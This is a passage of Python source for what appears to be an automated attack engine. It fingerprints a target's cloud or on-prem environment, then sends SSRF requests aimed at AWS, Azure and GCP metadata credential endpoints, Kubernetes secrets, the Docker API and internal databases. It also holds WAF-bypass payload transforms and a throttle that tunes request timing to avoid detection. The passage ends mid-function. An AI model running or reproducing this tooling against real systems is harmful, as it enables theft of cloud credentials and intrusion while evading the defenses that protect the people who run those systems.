"""
MSE Dynamic Attack Reasoning Engine
====================================
Zero-Knowledge Decision Tree that builds attack strategies from scan findings.
No hardcoded vectors â€” the tree is constructed dynamically based on:
  1. Infrastructure fingerprint (AWS/Azure/GCP/On-prem)
  2. Vulnerability classes discovered during reconnaissance
  3. Real-time response drift monitoring with WAF bypass recalibration
  4. Deep exploit validation (proof-of-value for each confirmed finding)

Architecture:
  InfraFingerprint  â†’ Detects cloud/on-prem environment from findings
  BaselineMonitor   â†’ Tracks response baselines, detects defense drift
  WAFBypassEngine   â†’ Obfuscation layer when defenses block payloads
  AttackNode        â†’ Base class for decision tree nodes
  DecisionTree      â†’ Orchestrator that builds & traverses the tree
"""

import asyncio
import re
import time
import json
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse, urljoin, quote

import httpx


class InfraType(Enum):
    AWS = "aws"
    AZURE = "azure"
    GCP = "gcp"
    KUBERNETES = "kubernetes"
    DOCKER = "docker"
    ON_PREMISE = "on_premise"
    UNKNOWN = "unknown"


class VulnClass(Enum):
    SSRF = "ssrf"
    SQLI = "sqli"
    XSS = "xss"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"
    ECOMMERCE = "ecommerce"
    API_EXPOSURE = "api_exposure"
    VERB_TAMPERING = "verb_tampering"
    SSTI = "ssti"
    PATH_TRAVERSAL = "path_traversal"
    CREDENTIAL_LEAK = "credential_leak"
    OPEN_REDIRECT = "open_redirect"
    CORS_MISCONFIG = "cors_misconfig"
    HEADER_INJECTION = "header_injection"
    XXE = "xxe"
    COMMAND_INJECTION = "cmdi"
    NOSQL_INJECTION = "nosqli"
    DESERIALIZATION = "deserialization"


@dataclass
class ResponseBaseline:
    endpoint: str
    method: str
    status_code: int
    response_time_ms: int
    content_length: int
    content_hash: str
    headers_hash: str
    timestamp: float
    waf_detected: bool = False
    challenge_page: bool = False


@dataclass
class DriftEvent:
    endpoint: str
    field: str
    old_value: Any
    new_value: Any
    timestamp: float
    interpreted_as: str


@dataclass
class ExploitResult:
    node_id: str
    vuln_class: str
    technique: str
    target_endpoint: str
    method: str
    payload: str
    status_code: int
    response_time_ms: int
    vulnerable: bool
    evidence: str
    severity: str
    infra_context: str
    bypass_used: Optional[str] = None
    drift_detected: bool = False
    deep_validation: Optional[Dict] = None


def _ts() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + f".{int(time.time() * 1000) % 1000:03d}"


def _hash(text: str) -> str:
    return hashlib.md5(text.encode("utf-8", errors="replace")).hexdigest()[:16]


class StealthThrottle:
    STEALTH_MIN_DELAY = 0.05
    STEALTH_MAX_DELAY = 3.0
    BLOCK_WINDOW = 30.0
    ESCALATION_THRESHOLD = 3
    DEESCALATION_THRESHOLD = 10
    LEVELS = [
        {"name": "GHOST", "delay": 0.05, "jitter": 0.02, "desc": "minimal footprint"},
        {"name": "WHISPER", "delay": 0.25, "jitter": 0.10, "desc": "low-profile recon"},
        {"name": "CAUTIOUS", "delay": 0.6, "jitter": 0.20, "desc": "WAF evasion active"},
        {"name": "STEALTH", "delay": 1.2, "jitter": 0.40, "desc": "heavy WAF resistance"},
        {"name": "CRAWL", "delay": 2.0, "jitter": 0.60, "desc": "maximum evasion mode"},
        {"name": "HIBERNATE", "delay": 3.0, "jitter": 1.0, "desc": "critical detection risk"},
    ]

    def __init__(self, log_fn=None, emit_fn=None):
        self.log = log_fn or (lambda *a: None)
        self.emit = emit_fn or (lambda *a: None)
        self.level_index = 0
        self.total_requests = 0
        self.total_blocks = 0
        self.consecutive_blocks = 0
        self.consecutive_ok = 0
        self.block_timestamps: List[float] = []
        self.escalation_count = 0
        self.deescalation_count = 0
        self._last_level_change = time.time()
        self._lock = asyncio.Lock()

    @property
    def current_level(self) -> Dict:
        return self.LEVELS[self.level_index]

    @property
    def global_block_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return self.total_blocks / self.total_requests

    @property
    def recent_block_rate(self) -> float:
        now = time.time()
        cutoff = now - self.BLOCK_WINDOW
        recent = [t for t in self.block_timestamps if t > cutoff]
        if self.total_requests < 5:
            return 0.0
        window_requests = min(self.total_requests, max(len(recent) * 3, 10))
        return len(recent) / window_requests if window_requests > 0 else 0.0

    async def record(self, status_code: int, drift_events: Optional[List] = None):
        async with self._lock:
            self.total_requests += 1
            is_block = status_code in (403, 429, 503)
            is_rate_limit = status_code == 429

            if is_block:
                self.total_blocks += 1
                self.consecutive_blocks += 1
                self.consecutive_ok = 0
                self.block_timestamps.append(time.time())

                if is_rate_limit:
                    self._escalate(reason=f"HTTP 429 rate limited", jumps=2)
                elif self.consecutive_blocks >= self.ESCALATION_THRESHOLD:
                    self._escalate(reason=f"{self.consecutive_blocks} consecutive blocks")
            else:
                self.consecutive_blocks = 0
                self.consecutive_ok += 1
                if self.consecutive_ok >= self.DEESCALATION_THRESHOLD and self.level_index > 0:
                    self._deescalate(reason=f"{self.consecutive_ok} consecutive OK responses")

            if drift_events:
                waf_drifts = [d for d in drift_events if hasattr(d, 'interpreted_as') and 'waf' in str(d.interpreted_as)]
                if len(waf_drifts) >= 2:
                    self._escalate(reason=f"{len(waf_drifts)} WAF drift events in single request")

            recent_rate = self.recent_block_rate
            if recent_rate > 0.6 and self.level_index < 4:
                self._escalate(reason=f"recent block rate {recent_rate:.0%} exceeds 60%")

    def _escalate(self, reason: str, jumps: int = 1):
        old_level = self.level_index
        self.level_index = min(self.level_index + jumps, len(self.LEVELS) - 1)
        if self.level_index != old_level:
            self.escalation_count += 1
            self._last_level_change = time.time()
            new = self.current_level
            self.log(
                f"[STEALTH] â–² ESCALATED: {self.LEVELS[old_level]['name']} â†’ {new['name']} â€” "
                f"{reason} | delay={new['delay']}sÂ±{new['jitter']}s ({new['desc']})",
                "warn", "stealth"
            )
            self.emit("stealth_escalation", {
                "from": self.LEVELS[old_level]["name"],
                "to": new["name"],
                "reason": reason,
                "delay": new["delay"],
                "block_rate": f"{self.global_block_rate:.0%}",
            })

    def _deescalate(self, reason: str):
        old_level = self.level_index
        self.level_index = max(self.level_index - 1, 0)
        if self.level_index != old_level:
            self.deescalation_count += 1
            self.consecutive_ok = 0
            self._last_level_change = time.time()
            new = self.current_level
            self.log(
                f"[STEALTH] â–¼ DE-ESCALATED: {self.LEVELS[old_level]['name']} â†’ {new['name']} â€” "
                f"{reason} | delay={new['delay']}sÂ±{new['jitter']}s",
                "info", "stealth"
            )
            self.emit("stealth_deescalation", {
                "from": self.LEVELS[old_level]["name"],
                "to": new["name"],
                "reason": reason,
                "delay": new["delay"],
            })

    async def wait(self):
        level = self.current_level
        import random
        jitter = random.uniform(-level["jitter"], level["jitter"])
        delay = max(self.STEALTH_MIN_DELAY, level["delay"] + jitter)
        await asyncio.sleep(delay)

    def to_dict(self) -> Dict:
        return {
            "current_level": self.current_level["name"],
            "level_index": self.level_index,
            "delay_ms": int(self.current_level["delay"] * 1000),
            "total_requests": self.total_requests,
            "total_blocks": self.total_blocks,
            "global_block_rate": f"{self.global_block_rate:.1%}",
            "recent_block_rate": f"{self.recent_block_rate:.1%}",
            "escalations": self.escalation_count,
            "deescalations": self.deescalation_count,
            "consecutive_blocks": self.consecutive_blocks,
            "consecutive_ok": self.consecutive_ok,
        }


INFRA_FINGERPRINT_RULES: Dict[InfraType, List[Dict]] = {
    InfraType.AWS: [
        {"pattern": r"(?:169\.254\.169\.254|ec2|ami-|iam|aws|s3://|lambda|cloudfront|elb|rds|dynamodb|sqs|sns|elasticache|ecs|eks|fargate|cloudwatch|cloudformation)", "weight": 3},
        {"pattern": r"(?:AmazonS3|X-Amz-|x-amz-request-id|AWS_|AKIA[0-9A-Z]|ap-southeast|us-east|eu-west|sa-east)", "weight": 2},
        {"pattern": r"(?:amazonaws\.com|\.aws\.)", "weight": 4},
    ],
    InfraType.AZURE: [
        {"pattern": r"(?:azure|\.azure\.|windowsazure|\.blob\.core|\.table\.core|\.queue\.core)", "weight": 3},
        {"pattern": r"(?:x-ms-request-id|x-ms-version|Microsoft-IIS|Azure|AzureWebJobsStorage|AZURE_)", "weight": 2},
        {"pattern": r"(?:168\.63\.129\.16|169\.254\.169\.254/metadata.*api-version|\.azurewebsites\.net|\.azurefd\.net)", "weight": 4},
    ],
    InfraType.GCP: [
        {"pattern": r"(?:metadata\.google\.internal|\.googleapis\.com|gcloud|GCP_|GOOGLE_CLOUD)", "weight": 3},
        {"pattern": r"(?:x-goog-|X-Cloud-Trace|\.appspot\.com|\.run\.app|\.cloudfunctions\.net|gce_|gke_)", "weight": 2},
        {"pattern": r"(?:projects/[a-z][a-z0-9-]+/|gs://)", "weight": 4},
    ],
    InfraType.KUBERNETES: [
        {"pattern": r"(?:kubernetes|k8s|kubectl|kube-system|serviceAccount|pod|namespace|helm|ingress)", "weight": 3},
        {"pattern": r"(?:10255|10250|6443|/api/v1/|/apis/|etcd|kubelet|kube-proxy|coredns)", "weight": 2},
    ],
    InfraType.DOCKER: [
        {"pattern": r"(?:docker|container|2375|2376|containerd|moby|docker\.sock|overlay2)", "weight": 3},
        {"pattern": r"(?:DockerFile|docker-compose|\.dockerignore|DOCKER_HOST)", "weight": 2},
    ],
}

VULN_CLASS_EXTRACTION_RULES: Dict[VulnClass, List[str]] = {
    VulnClass.SSRF: [
        r"ssrf", r"server.side.request", r"url.*param", r"\?url=", r"\?src=", r"\?file=",
        r"\?proxy=", r"\?fetch=", r"\?dest=", r"\?redirect=", r"\?callback=",
        r"/api/fetch", r"/api/proxy", r"/api/image", r"/api/webhook", r"/api/import",
        r"/proxy", r"/fetch", r"/redirect", r"internal.*metadata", r"169\.254",
    ],
    VulnClass.SQLI: [
        r"sql.inject", r"sqli", r"sql.error", r"union.select", r"information_schema",
        r"sleep\(", r"waitfor.delay", r"benchmark\(", r"pg_sleep", r"sql.syntax",
        r"mysql_", r"pg_query", r"sqlite", r"mssql", r"oracle.*error",
    ],
    VulnClass.XSS: [
        r"xss", r"cross.site.script", r"innerHTML", r"eval\(", r"document\.write",
        r"dangerouslySetInnerHTML", r"onerror", r"onload", r"javascript:",
        r"reflected.*input", r"unsanitized", r"dom.inject",
    ],
    VulnClass.AUTH_BYPASS: [
        r"auth.*bypass", r"authentication.*missing", r"no.*auth", r"unauthenticated",
        r"/admin.*exposed", r"session.*hijack", r"token.*forge", r"jwt.*secret",
        r"privilege.*escalat", r"idor", r"insecure.direct",
    ],
    VulnClass.ECOMMERCE: [
        r"price.*manipul", r"cart.*update", r"checkout", r"coupon", r"discount",
        r"payment.*bypass", r"unit_price", r"price.*override", r"inventory",
        r"order.*tamper", r"/cart/", r"/checkout/", r"/api/payment",
    ],
    VulnClass.API_EXPOSURE: [
        r"api.*endpoint.*exposed", r"api.*key.*exposed", r"sensitive.*api",
        r"/api/v\d+/", r"/graphql", r"/swagger", r"/api-docs", r"open.api",
        r"/internal/", r"/debug/", r"/health", r"/metrics",
    ],
    VulnClass.VERB_TAMPERING: [
        r"http.*method", r"put.*accept", r"delete.*accept", r"trace.*method",
        r"verb.*tamper", r"options.*expose", r"dav", r"move.*copy",
    ],
    VulnClass.SSTI: [
        r"ssti", r"template.*inject", r"jinja", r"twig", r"freemarker",
        r"\{\{.*\}\}", r"\$\{.*\}", r"<%=.*%>",
    ],
    VulnClass.PATH_TRAVERSAL: [
        r"path.*traversal", r"directory.*traversal", r"\.\.\/", r"etc/passwd",
        r"file.*inclusion", r"lfi", r"rfi", r"local.file",
    ],
    VulnClass.CREDENTIAL_LEAK: [
        r"credential", r"password.*exposed", r"secret.*key", r"api.*key.*leak",
        r"access.*key", r"private.*key", r"database.*uri", r"connection.*string",
        r"hardcoded.*pass", r"jwt.*secret",
    ],
    VulnClass.OPEN_REDIRECT: [
        r"open.*redirect", r"redirect.*bypass", r"url.*redirect", r"location.*hijack",
        r"unvalidated.*redirect",
    ],
    VulnClass.CORS_MISCONFIG: [
        r"cors.*wildcard", r"cors.*bypass", r"cors.*misconfig", r"access.control.allow.origin",
        r"cors.*subdomain", r"cors.*reflect", r"cors.*credential",
    ],
    VulnClass.XXE: [
        r"xxe", r"xml.*external", r"entity.*inject", r"dtd.*process",
    ],
    VulnClass.COMMAND_INJECTION: [
        r"command.*inject", r"os.*inject", r"rce", r"remote.*code.*exec",
        r"shell.*inject", r"cmd.*inject",
    ],
    VulnClass.NOSQL_INJECTION: [
        r"nosql", r"mongodb.*inject", r"\$gt", r"\$ne", r"\$regex",
        r"prototype.*pollut", r"__proto__",
    ],
}

SSRF_TARGETS_BY_INFRA: Dict[InfraType, List[Dict]] = {
    InfraType.AWS: [
        {"name": "AWS IMDSv1 Metadata", "url": "http://169.254.169.254/latest/meta-data/", "detect": ["ami-id", "instance-id", "hostname", "iam"]},
        {"name": "AWS IAM Credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "detect": ["AccessKeyId", "SecretAccessKey", "Token"]},
        {"name": "AWS Instance Identity", "url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "detect": ["instanceId", "accountId", "region"]},
        {"name": "AWS User Data", "url": "http://169.254.169.254/latest/user-data", "detect": ["#!/", "password", "key", "secret"]},
        {"name": "AWS Container Credentials", "url": "http://169.254.170.2/v2/credentials", "detect": ["AccessKeyId", "SecretAccessKey", "RoleArn"]},
        {"name": "AWS ECS Task Metadata", "url": "http://169.254.170.2/v2/metadata", "detect": ["Cluster", "TaskARN", "Family"]},
    ],
    InfraType.AZURE: [
        {"name": "Azure Instance Metadata", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "detect": ["vmId", "subscriptionId", "resourceGroupName"], "headers": {"Metadata": "true"}},
        {"name": "Azure Identity Token", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "detect": ["access_token", "token_type", "expires_in"], "headers": {"Metadata": "true"}},
        {"name": "Azure Attested Data", "url": "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01", "detect": ["encoding", "signature"], "headers": {"Metadata": "true"}},
        {"name": "Azure Load Balancer", "url": "http://168.63.129.16/machine?comp=goalstate", "detect": ["GoalState", "RoleInstance"]},
    ],
    InfraType.GCP: [
        {"name": "GCP Project Metadata", "url": "http://metadata.google.internal/computeMetadata/v1/project/", "detect": ["project-id", "numeric-project-id"], "headers": {"Metadata-Flavor": "Google"}},
        {"name": "GCP Instance Metadata", "url": "http://metadata.google.internal/computeMetadata/v1/instance/", "detect": ["hostname", "zone", "machine-type"], "headers": {"Metadata-Flavor": "Google"}},
        {"name": "GCP Service Account Token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "detect": ["access_token", "token_type", "expires_in"], "headers": {"Metadata-Flavor": "Google"}},
        {"name": "GCP kube-env", "url": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", "detect": ["KUBERNETES", "TPM_BOOTSTRAP", "CA_CERT"], "headers": {"Metadata-Flavor": "Google"}},
    ],
    InfraType.KUBERNETES: [
        {"name": "Kubelet Pods API", "url": "http://127.0.0.1:10255/pods", "detect": ["metadata", "namespace", "containers"]},
        {"name": "Kubelet Healthz", "url": "http://127.0.0.1:10255/healthz", "detect": ["ok"]},
        {"name": "Kubernetes API", "url": "https://127.0.0.1:6443/api/v1/namespaces", "detect": ["items", "metadata", "kind"]},
        {"name": "Kubernetes Secrets", "url": "https://127.0.0.1:6443/api/v1/secrets", "detect": ["items", "data", "type"]},
        {"name": "etcd Store", "url": "http://127.0.0.1:2379/v2/keys/", "detect": ["node", "key", "value"]},
    ],
    InfraType.DOCKER: [
        {"name": "Docker Engine API", "url": "http://127.0.0.1:2375/version", "detect": ["ApiVersion", "GitCommit", "GoVersion"]},
        {"name": "Docker Containers", "url": "http://127.0.0.1:2375/containers/json", "detect": ["Id", "Names", "Image"]},
        {"name": "Docker Images", "url": "http://127.0.0.1:2375/images/json", "detect": ["Id", "RepoTags", "Created"]},
    ],
    InfraType.ON_PREMISE: [
        {"name": "Redis INFO", "url": "http://127.0.0.1:6379/info", "detect": ["redis_version", "connected_clients"]},
        {"name": "Elasticsearch Health", "url": "http://127.0.0.1:9200/_cluster/health", "detect": ["cluster_name", "status"]},
        {"name": "Consul Agent", "url": "http://127.0.0.1:8500/v1/agent/self", "detect": ["Config", "Member"]},
        {"name": "RabbitMQ Management", "url": "http://127.0.0.1:15672/api/overview", "detect": ["rabbitmq_version", "cluster_name"]},
        {"name": "MongoDB Status", "url": "http://127.0.0.1:27017/", "detect": ["version", "ok"]},
        {"name": "Memcached Stats", "url": "http://127.0.0.1:11211/", "detect": ["STAT", "version"]},
        {"name": "CouchDB", "url": "http://127.0.0.1:5984/", "detect": ["couchdb", "version", "uuid"]},
        {"name": "PostgreSQL", "url": "http://127.0.0.1:5432/", "detect": ["PostgreSQL", "FATAL"]},
        {"name": "MySQL", "url": "http://127.0.0.1:3306/", "detect": ["mysql", "MariaDB"]},
    ],
    InfraType.UNKNOWN: [
        {"name": "AWS Metadata Probe", "url": "http://169.254.169.254/latest/meta-data/", "detect": ["ami-id", "instance-id"]},
        {"name": "Azure Metadata Probe", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "detect": ["vmId", "subscriptionId"], "headers": {"Metadata": "true"}},
        {"name": "GCP Metadata Probe", "url": "http://metadata.google.internal/computeMetadata/v1/", "detect": ["project-id"], "headers": {"Metadata-Flavor": "Google"}},
        {"name": "Redis Probe", "url": "http://127.0.0.1:6379/info", "detect": ["redis_version"]},
        {"name": "Docker Probe", "url": "http://127.0.0.1:2375/version", "detect": ["ApiVersion"]},
    ],
}

WAF_BYPASS_TECHNIQUES = [
    {
        "name": "Case Alternation",
        "transform": lambda p: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
    },
    {
        "name": "URL Double Encoding",
        "transform": lambda p: quote(quote(p, safe="")),
    },
    {
        "name": "Null Byte Injection",
        "transform": lambda p: p.replace(" ", "%00 ").replace("'", "%00'"),
    },
    {
        "name": "Unicode Normalization",
        "transform": lambda p: p.replace("<", "\uff1c").replace(">", "\uff1e").replace("'", "\u2019"),
    },
    {
        "name": "Comment Obfuscation (SQL)",
        "transform": lambda p: p.replace(" ", "/**/").replace("OR", "O/**/R").replace("SELECT", "SE/**/LECT").replace("UNION", "UN/**/ION"),
    },
    {
        "name": "Chunked Transfer Bypass",
        "transform": lambda p: p,
        "headers": {"Transfer-Encoding": "chunked"},
    },
    {
        "name": "HTTP Parameter Pollution",
        "transform": lambda p: p,
        "param_duplicate": True,
    },
    {
        "name": "Tab/Newline Substitution",
        "transform": lambda p: p.replace(" ", "\t").replace(",", "\n,"),
    },
]


class InfraFingerprint:
    def __init__(self):
        self.scores: Dict[InfraType, int] = {t: 0 for t in InfraType}
        self.evidence: Dict[InfraType, List[str]] = {t: [] for t in InfraType}
        self.detected: InfraType = InfraType.UNKNOWN
        self.secondary: List[InfraType] = []

    def ingest_findings(self, findings: List[Dict]) -> InfraType:
        corpus = ""
        for f in findings:
            corpus += f" {f.get('title', '')} {f.get('description', '')} {f.get('evidence', '')} {f.get('category', '')}"

        corpus_lower = corpus.lower()

        for infra_type, rules in INFRA_FINGERPRINT_RULES.items():
            for rule in rules:
                matches = re.findall(rule["pattern"], corpus_lower, re.I)
                if matches:
                    self.scores[infra_type] += rule["weight"] * len(matches)
                    self.evidence[infra_type].extend(matches[:3])

        ranked = sorted(
            [(t, s) for t, s in self.scores.items() if s > 0 and t != InfraType.UNKNOWN],
            key=lambda x: x[1],
            reverse=True,
        )

        if ranked:
            self.detected = ranked[0][0]
            self.secondary = [t for t, _ in ranked[1:3] if _ > 2]
        else:
            self.detected = InfraType.ON_PREMISE

        return self.detected

    def get_ssrf_targets(self) -> List[Dict]:
        targets = list(SSRF_TARGETS_BY_INFRA.get(self.detected, []))
        for secondary in self.secondary:
            for t in SSRF_TARGETS_BY_INFRA.get(secondary, []):
                if t["name"] not in [x["name"] for x in targets]:
                    targets.append(t)
        if self.detected == InfraType.UNKNOWN:
            targets = list(SSRF_TARGETS_BY_INFRA[InfraType.UNKNOWN])
        for on_prem in SSRF_TARGETS_BY_INFRA.get(InfraType.ON_PREMISE, []):
            if on_prem["name"] not in [x["name"] for x in targets]:
                targets.append(on_prem)
        return targets

    def to_dict(self) -> Dict:
        return {
            "primary": self.detected.value,
            "secondary": [s.value for s in self.secondary],
            "scores": {t.value: s for t, s in self.scores.items() if s > 0},
            "evidence_count": {t.value: len(e) for t, e in self.evidence.items() if e},
        }


class BaselineMonitor:
    def __init__(self):
        self.baselines: Dict[str, ResponseBaseline] = {}
        self.drift_events: List[DriftEvent] = []
        self.waf_indicators = [
            re.compile(r"(?:cloudflare|akamai|incapsula|sucuri|f5|barracuda|fortinet|mod_security|waf|challenge)", re.I),
            re.compile(r"(?:cf-ray|x-sucuri|x-cdn|x-waf|x-akamai|server:.*cloudflare)", re.I),
        ]

    def record_baseline(self, endpoint: str, method: str, resp: httpx.Response, elapsed_ms: int):
        body = resp.text[:2000]
        headers_str = str(sorted(resp.headers.items()))
        waf = any(p.search(headers_str) or p.search(body) for p in self.waf_indicators)
        challenge = any(kw in body.lower() for kw in [
            "challenge", "captcha", "verify you are human", "access denied",
            "ray id", "blocked", "firewall", "security check",
        ])

        key = f"{method}:{endpoint}"
        self.baselines[key] = ResponseBaseline(
            endpoint=endpoint,
            method=method,
            status_code=resp.status_code,
            response_time_ms=elapsed_ms,
            content_length=len(body),
            content_hash=_hash(body),
            headers_hash=_hash(headers_str),
            timestamp=time.time(),
            waf_detected=waf,
            challenge_page=challenge,
        )

    def check_drift(self, endpoint: str, method: str, resp: httpx.Response, elapsed_ms: int) -> List[DriftEvent]:
        key = f"{method}:{endpoint}"
        baseline = self.baselines.get(key)
        if not baseline:
            self.record_baseline(endpoint, method, resp, elapsed_ms)
            return []

        events = []
        now = time.time()
        body = resp.text[:2000]

        if resp.status_code != baseline.status_code:
            events.append(DriftEvent(
                endpoint=endpoint,
                field="status_code",
                old_value=baseline.status_code,
                new_value=resp.status_code,
                timestamp=now,
                interpreted_as="waf_block" if resp.status_code in (403, 429, 503) else "behavior_change",
            ))

        new_hash = _hash(body)
        if new_hash != baseline.content_hash:
            size_ratio = len(body) / max(baseline.content_length, 1)
            if size_ratio < 0.3 or size_ratio > 3.0:
                events.append(DriftEvent(
                    endpoint=endpoint,
                    field="content_size",
                    old_value=baseline.content_length,
                    new_value=len(body),
                    timestamp=now,
                    interpreted_as="waf_block" if len(body) < baseline.content_length * 0.3 else "response_change",
                ))

        if elapsed_ms > baseline.response_time_ms * 5 and elapsed_ms > 2000:
            events.append(DriftEvent(
                endpoint=endpoint,
                field="response_time",
                old_value=baseline.response_time_ms,
                new_value=elapsed_ms,
                timestamp=now,
                interpreted_as="rate_limit" if elapsed_ms > 5000 else "latency_spike",
            ))

        challenge = any(kw in body.lower() for kw in [
            "challenge", "captcha", "verify you are human", "blocked", "firewall",
        ])
        if challenge and not baseline.challenge_page:
            events.append(DriftEvent(
                endpoint=endpoint,
                field="challenge_page",
                old_value=False,
                new_value=True,
                timestamp=now,
                interpreted_as="waf_activated",
            ))

        self.drift_events.extend(events)
        return events

    def should_attempt_bypass(self, endpoint: str, method: str) -> bool:
        recent = [
            d for d in self.drift_events
            if d.endpoint == endpoint and d.interpreted_as.startswith("waf")
            and time.time() - d.timestamp < 120
        ]
        return len(recent) > 0

    def to_dict(self) -> Dict:
        return {
            "baselines_recorded": len(self.baselines),
            "drift_events": len(self.drift_events),
            "drift_details": [
                {"endpoint": d.endpoint, "field": d.field, "interpretation": d.interpreted_as}
                for d in self.drift_events[-20:]
            ],
            "waf_endpoints": [
                k for k, b in self.baselines.items() if b.waf_detected or b.challenge_page
            ],
        }


class WAFBypassEngine:
    def __init__(self, client: httpx.AsyncClient, base_url: str, log_fn=None):
        self.client = client
        self.base_url = base_url
        self.log = log_fn or (lambda *a: None)
        self.successful_bypasses: Dict[str, str] = {}
        self.attempts: int = 0
        self.successes: int = 0

    async def try_bypass(
        self,
        endpoint: str,
        method: str,
        payload: str,
        original_status: int,
        detect_keywords: List[str] = None,
    ) -> Optional[Tuple[httpx.Response, str, int]]:
        for technique in WAF_BYPASS_TECHNIQUES:
            self.attempts += 1
            try:
                transformed = technique["transform"](payload)
                extra_headers = technique.get("headers", {})
                url = f"{self.base_url}{endpoint}"

                start = time.time()
                if method.upper() in ("GET", "HEAD"):
                    sep = "&" if "?" in endpoint else "?"
                    resp = await self.client.get(
                        f"{url}{sep}payload={transformed}",
                        headers=extra_headers,
                    )
                else:
                    resp = await self.client.request(
                        method, url,
                        content=transformed,
                        headers={**extra_headers, "Content-Type": "text/plain"},
                    )
                elapsed = int((time.time() - start) * 1000)

                if resp.status_code != original_status and resp.status_code in (200, 201, 202, 204):
                    self.successes += 1
                    self.successful_bypasses[endpoint] = technique["name"]
                    self.log(
                        f"[BYPASS] WAF bypassed on {endpoint} using '{technique['name']}' "
                        f"({original_status} â†’ {resp.status_code})",
                        "error", "decision_intel"
                    )
                    return resp, technique["name"], elapsed

                if detect_keywords and resp.status_code < 400:
                    body = resp.text[:4000].lower()
                    if any(kw.lower() in body for kw in detect_keywords):
                        self.successes += 1
                        self.successful_bypasses[endpoint] = technique["name"]
                        return resp, technique["name"], elapsed

            except Exception:
                pass

        return None

    def to_dict(self) -> Dict:
        return {
            "attempts": self.attempts,
            "successes": self.successes,
            "successful_bypasses": dict(self.successful_bypasses),
        }


class AttackNode:
    def __init__(
        self,
        node_id: str,
        vuln_class: VulnClass,
        source_findings: List[Dict],
        infra: InfraFingerprint,
        client: httpx.AsyncClient,
        base_url: str,
        baseline_monitor: BaselineMonitor,
        waf_engine: WAFBypassEngine,
        log_fn=None,
        emit_fn=None,
        add_finding_fn=None,
        add_probe_fn=None,
        stealth_throttle: Optional[StealthThrottle] = None,
    ):
        self.node_id = node_id
        self.vuln_class = vuln_class
        self.source_findings = source_findings
        self.infra = infra
        self.client = client
        self.base_url = base_url
        self.monitor = baseline_monitor
        self.waf = waf_engine
        self.log = log_fn or (lambda *a: None)
        self.emit = emit_fn or (lambda *a: None)
        self.add_finding = add_finding_fn or (lambda *a: None)
        self.add_probe = add_probe_fn or (lambda *a: None)
        self.throttle = stealth_throttle
        self.results: List[ExploitResult] = []
        self.children: List["AttackNode"] = []

    def _extract_context(self) -> Dict:
        endpoints = []
        params = []
        methods = []
        for f in self.source_findings:
            combined = f"{f.get('title', '')} {f.get('description', '')} {f.get('evidence', '')}".lower()
            ep_matches = re.findall(r"(/[a-zA-Z0-9/_\-\.]+)", combined)
            endpoints.extend([e for e in ep_matches if len(e) > 3 and not e.endswith(('.js', '.css', '.png', '.jpg', '.ico'))])
            param_matches = re.findall(r"[?&]([a-zA-Z_]+)=", combined)
            params.extend(param_matches)
            for m in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]:
                if m.lower() in combined:
                    methods.append(m)
        return {
            "endpoints": list(set(endpoints))[:15],
            "params": list(set(params))[:10],
            "methods": list(set(methods)) or ["GET", "POST"],
        }

    async def _request_with_drift(
        self, method: str, url: str, **kwargs
    ) -> Tuple[Optional[httpx.Response], int, List[DriftEvent]]:
        if self.throttle:
            await self.throttle.wait()
        start = time.time()
        try:
            resp = await self.client.request(method, url, **kwargs)
            elapsed = int((time.time() - start) * 1000)
            parsed = urlparse(url)
            endpoint = parsed.path
            drift = self.monitor.check_drift(endpoint, method, resp, elapsed)
            if self.throttle:
                await self.throttle.record(resp.status_code, drift)
            return resp, elapsed, drift
        except Exception:
            return None, 0, []

    def _build_result(self, **kwargs) -> ExploitResult:
        r = ExploitResult(
            node_id=self.node_id,
            vuln_class=self.vuln_class.value,
            infra_context=self.infra.detected.value,
            **kwargs,
        )
        self.results.append(r)
        return r

    async def execute(self) -> List[ExploitResult]:
        raise NotImplementedError


class SSRFAttackNode(AttackNode):
    async def execute(self) -> List[ExploitResult]:
        ctx = self._extract_context()
        ssrf_endpoints = [e for e in ctx["endpoints"] if any(
            kw in e.lower() for kw in ["proxy", "fetch", "image", "url", "import", "load", "redirect", "webhook", "resource"]
        )]
        if not ssrf_endpoints:
            ssrf_endpoints = ["/api/proxy", "/api/fetch", "/api/image"]

        ssrf_params = [p for p in ctx["params"] if p in (
            "url", "src", "file", "path", "href", "uri", "proxy", "fetch",
            "dest", "resource", "load", "data", "redirect", "callback", "forward",
            "next", "return_to", "image", "import", "link", "ref",
        )]
        if not ssrf_params:
            ssrf_params = ["url", "src", "file"]

        targets = self.infra.get_ssrf_targets()
        self.log(
            f"[TREE:{self.node_id}] SSRF node activated â€” {len(ssrf_endpoints)} endpoints, "
            f"{len(ssrf_params)} params, {len(targets)} targets ({self.infra.detected.value})",
            "warn", "decision_intel"
        )

        for target in targets:
            confirmed = False
            for endpoint in ssrf_endpoints[:4]:
                if confirmed:
                    break
                for param in ssrf_params[:3]:
                    url = f"{self.base_url}{endpoint}?{param}={target['url']}"
                    extra_headers = target.get("headers", {})

                    resp, elapsed, drift = await self._request_with_drift(
                        "GET", url, headers=extra_headers,
                    )
                    if not resp:
                        continue

                    body = resp.text[:8000]
                    hit = any(kw.lower() in body.lower() for kw in target["detect"])
                    bypass_used = None

                    if not hit and resp.status_code in (403, 429, 503):
                        if self.monitor.should_attempt_bypass(endpoint, "GET"):
                            bypass_result = await self.waf.try_bypass(
                                f"{endpoint}?{param}={target['url']}",
                                "GET", target["url"], resp.status_code, target["detect"],
                            )
                            if bypass_result:
                                resp, bypass_used, elapsed = bypass_result
                                body = resp.text[:8000]
                                hit = any(kw.lower() in body.lower() for kw in target["detect"])

                    result = self._build_result(
                        technique="ssrf_credential_dump",
                        target_endpoint=f"{endpoint}?{param}=...",
                        method="GET",
